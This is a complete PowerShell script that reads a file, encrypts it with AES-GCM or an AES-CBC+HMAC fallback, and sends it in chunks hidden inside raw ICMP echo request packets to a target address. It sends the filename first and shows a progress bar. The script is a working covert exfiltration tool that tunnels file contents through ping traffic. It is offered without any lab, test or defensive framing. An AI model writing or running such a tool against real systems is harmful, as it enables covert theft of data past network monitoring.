param (
    [string]$Target,
    [string]$File,
    [string]$HexKey
)

function HexToBytes {
    param ([string]$Hex)
    $bytes = New-Object byte[] ($Hex.Length / 2)
    for ($i = 0; $i -lt $Hex.Length; $i += 2) {
        $bytes[$i / 2] = [Convert]::ToByte($Hex.Substring($i, 2), 16)
    }
    return $bytes
}

# AES-GCM encryptor for PS7+
function Get-AesGcmEncryptor {
    param ([byte[]]$Key)

    try {
        $aesGcm = [System.Security.Cryptography.AesGcm]::new($Key)
        return $aesGcm
    } catch {
        return $null
    }
}

function Encrypt-WithAesCbcHmac {
    param (
        [byte[]]$Key,
        [byte[]]$Plaintext
    )

    # Split key: first 16 bytes AES key, last 16 bytes HMAC key (assuming 32 bytes key)
    $aesKey = $Key[0..15]
    $hmacKey = $Key[16..31]

    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($iv)

    # AES CBC encrypt
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $aesKey
    $aes.IV = $iv

    $encryptor = $aes.CreateEncryptor()
    $cipher = $encryptor.TransformFinalBlock($Plaintext, 0, $Plaintext.Length)

    # Compute HMAC-SHA256 over IV + cipher
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $hmacKey
    $tag = $hmac.ComputeHash(($iv + $cipher))

    # Return IV + cipher + tag (tag 32 bytes)
    return ,($iv + $cipher + $tag)
}

function Send-PingChunk {
    param (
        [System.Net.Sockets.Socket]$Socket,
        [string]$Target,
        [int]$Id,
        [int]$Seq,
        [byte[]]$Payload
    )

    $icmpType = 8  # Echo request
    $icmpCode = 0
    $checksum = 0
    $icmpHeader = [byte[]]@(
        $icmpType,
        $icmpCode,
        0, 0,                      # placeholder checksum
        ($Id -shr 8), ($Id -band 0xFF),
        ($Seq -shr 8), ($Seq -band 0xFF)
    )

    $packet = $icmpHeader + $Payload

    # calculate checksum
    $sum = 0
    for ($i = 0; $i -lt $packet.Length; $i += 2) {
        $word = ($packet[$i] -shl 8)
        if ($i + 1 -lt $packet.Length) {
            $word = $word -bor $packet[$i + 1]
        }
        $sum += $word
    }
    $sum = ($sum -shr 16) + ($sum -band 0xFFFF)
    $sum += ($sum -shr 16)
    $checksum = $sum -bxor 0xFFFF
    $packet[2] = ($checksum -shr 8)
    $packet[3] = ($checksum -band 0xFF)

    # send
    $endpoint = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Parse($Target), 0)
    $Socket.SendTo($packet, $endpoint)
}

# -- Init --
$key = HexToBytes $HexKey

# Try to get AES-GCM encryptor (PowerShell 7+)
$aesGcm = Get-AesGcmEncryptor -Key $key

$raw = [System.IO.File]::ReadAllBytes($File)

if ($aesGcm) {
    # AES-GCM mode: chunk size smaller because of 12-byte nonce + 16-byte tag
    $chunkSize = 504  # 512 - 8 header
    $tagLength = 16
    $nonceLength = 12
    $useAesGcm = $true
} else {
    # AES-CBC + HMAC fallback: chunk size smaller because of 16-byte IV + 32-byte tag + 8 header
    $chunkSize = 456  # 512 - 8 header - 16 IV - 32 HMAC tag
    $useAesGcm = $false
}

$totalChunks = [math]::Ceiling($raw.Length / $chunkSize)

$socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Raw, [System.Net.Sockets.ProtocolType]::Icmp)
$pidValue = [System.Diagnostics.Process]::GetCurrentProcess().Id -band 0xFFFF

# --- SEND FILENAME FIRST ---

# Prepare filename bytes (UTF8)
$filenameBytes = [System.Text.Encoding]::UTF8.GetBytes([System.IO.Path]::GetFileName($File))

# Use a header with idx = -1 (0xFFFFFFFF signed int) but as unsigned short seq = 0xFFFF for ICMP seq field
# We'll pack idx=-1 as int32 in header, total=1 (dummy)
$idxHeader = [BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]-1))
$totalHeader = [BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]1))
$header = $idxHeader + $totalHeader

$plaintextFilename = $header + $filenameBytes

if ($useAesGcm) {
    $nonce = New-Object byte[] 12
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($nonce)

    $cipher = New-Object byte[] ($plaintextFilename.Length)
    $tag = New-Object byte[] $tagLength

    try {
        $aesGcm.Encrypt($nonce, $plaintextFilename, $cipher, $tag)
    } catch {
        Write-Error "Encryption failed on filename chunk : $_"
        exit
    }

    $payload = $nonce + $cipher + $tag
} else {
    $payload = Encrypt-WithAesCbcHmac -Key $key -Plaintext $plaintextFilename
}

# Send filename chunk with seq=0xFFFF (65535)
Send-PingChunk -Socket $socket -Target $Target -Id $pidValue -Seq 0xFFFF -Payload $payload | Out-Null

# --- SEND FILE CHUNKS ---

for ($i = 0; $i -lt $totalChunks; $i++) {
    $start = $i * $chunkSize
    $chunk = $raw[$start..([math]::Min($raw.Length - 1, $start + $chunkSize - 1))]

    if ([System.BitConverter]::IsLittleEndian) {
        $indexBytes = [BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]$i))
        $totalBytes = [BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]$totalChunks))
    } else {
        $indexBytes = [BitConverter]::GetBytes([int]$i)
        $totalBytes = [BitConverter]::GetBytes([int]$totalChunks)
    }

    $header = $indexBytes + $totalBytes
    $plaintext = $header + $chunk

    if ($useAesGcm) {
        $nonce = New-Object byte[] 12
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($nonce)

        $cipher = New-Object byte[] ($plaintext.Length)
        $tag = New-Object byte[] $tagLength

        try {
            $aesGcm.Encrypt($nonce, $plaintext, $cipher, $tag)
        } catch {
            Write-Error "Encryption failed on chunk $i : $_"
            continue
        }

        $payload = $nonce + $cipher + $tag
    } else {
        $payload = Encrypt-WithAesCbcHmac -Key $key -Plaintext $plaintext
    }

    Send-PingChunk -Socket $socket -Target $Target -Id $pidValue -Seq $i -Payload $payload | Out-Null

    Write-Progress -Activity "Sending $File" -Status "$($i + 1)/$totalChunks" -PercentComplete ((($i + 1) / $totalChunks) * 100)
}

